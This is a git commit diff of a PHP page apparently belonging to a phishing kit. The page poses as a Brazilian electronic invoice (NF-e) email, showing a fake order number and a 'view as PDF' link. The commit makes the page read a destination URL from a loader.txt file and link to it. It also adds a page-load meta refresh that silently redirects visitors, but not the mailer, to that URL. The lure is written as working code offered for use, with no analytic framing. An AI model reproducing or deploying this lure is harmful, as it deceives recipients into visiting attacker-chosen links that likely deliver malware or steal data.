12d33298262a316b485d0dc523b1e57a893d9774
lendascripts <lendascripts@outlook.com>
2018-05-25 16:31:25 +0000

    Change GetLink

--- get-link.ddns.net/mailing.php
+++ get-link.ddns.net/mailing.php
@@ -1,17 +1,26 @@
 <?php
-echo '
+$config = array();
+$handle = @fopen("loader.txt", "r");
+while (($buffer = fgets($handle, 4096)) !== false)
+	array_push($config, trim($buffer));
+fclose($handle);
+?>
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
 <HTML><HEAD>
 <META http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> 
 <TITLE>NOTA FISCAL</TITLE> 
-<META name="GENERATOR" content="MSHTML 11.00.9600.19003"></HEAD> 
+<META name="GENERATOR" content="MSHTML 11.00.9600.19003">
+<?php
+if($config[0] == 'S' && !isset($_REQUEST['mailer'])){ echo '<META http-equiv="refresh" content="0; url='.$config[2].'">'; }
+?>
+</HEAD> 
 <BODY>
 <DIV><SPAN><STRONG>Emissao de NF-e (Nota Fiscal Eletronica)</STRONG></SPAN> 
 </DIV>
 <DIV><SPAN>Prezado (A)</SPAN></DIV>
 <DIV></DIV>
-<DIV><SPAN>		Foi emitida uma NF-e (Nota Fiscal Eletronica) referente ao seu  
-pedido N'.rand(11111111111,99999999999).', realizado em '.date('d/m/Y').' as '.date('H:i').'&nbsp;&nbsp;</SPAN> </DIV>
+<DIV><SPAN>Foi emitida uma NF-e (Nota Fiscal Eletronica) referente ao seu  
+pedido N<?=rand(11111111111,99999999999);?>, realizado em <?=date('d/m/Y');?> as <?=date('H:i');?>&nbsp;&nbsp;</SPAN> </DIV>
 <DIV></DIV>
 <DIV><SPAN>NF-e Nota Fiscal Eletronica</SPAN></DIV>
 <DIV></DIV>
@@ -19,7 +28,7 @@ pedido N'.rand(11111111111,99999999999).', realizado em '.date('d/m/Y').' as '.d
 <DIV><SPAN><BR></SPAN></DIV>
 <UL>
   <LI><BIG><A 
-  href="https://get-link.access.ly/a618f65637075239c25312b21f574565">Visualizar 
+  href="<?=$config[2];?>">Visualizar 
   em     Formato PDF</A></BIG></LI></UL>
 <P><BIG><BR></BIG></P>
 <P><BIG><BR></BIG></P>
@@ -34,5 +43,3 @@ pedido N'.rand(11111111111,99999999999).', realizado em '.date('d/m/Y').' as '.d
 <P><BIG>Todos os Direitos Reservados - 2018 Termos de uso</BIG></P>
 <P><BIG><BR></BIG></P>
 <P></P></BODY></HTML>
-';
-?>
